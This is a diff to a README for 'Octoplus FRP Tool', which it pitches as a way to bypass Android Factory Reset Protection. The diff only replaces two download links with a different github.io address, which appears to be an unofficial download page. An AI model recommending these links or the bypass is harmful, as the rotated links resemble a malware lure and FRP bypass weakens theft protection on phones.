@@ -2,7 +2,7 @@
 
 Octoplus FRP Tool is a powerful and professional-grade solution for bypassing FRP (Factory Reset Protection) on a wide range of Android devices. It supports hundreds of brands and models, offering a fast, safe, and user-friendly process to unlock devices locked by Google account verification.
 
-[![Download Octoplus FRP Tool](https://img.shields.io/badge/Download-Octoplus%20FRP%20Tool-blueviolet)](https://octoplus-frp-tool-download.github.io/.github)
+[![Download Octoplus FRP Tool](https://img.shields.io/badge/Download-Octoplus%20FRP%20Tool-blueviolet)](https://smart-octoplus-frp.github.io/.github/)
 
 ---
 
@@ -35,7 +35,7 @@ Octoplus FRP Tool is a powerful and professional-grade solution for bypassing FR
 - Recover devices after failed OTA updates or resets  
 - Unlock demo phones for normal use  
 
-[![Download Octoplus FRP Tool](https://img.shields.io/badge/Download-Octoplus%20FRP%20Tool-blueviolet)](https://octoplus-frp-tool-download.github.io/.github)
+[![Download Octoplus FRP Tool](https://img.shields.io/badge/Download-Octoplus%20FRP%20Tool-blueviolet)](https://smart-octoplus-frp.github.io/.github/)
 
 ---
 
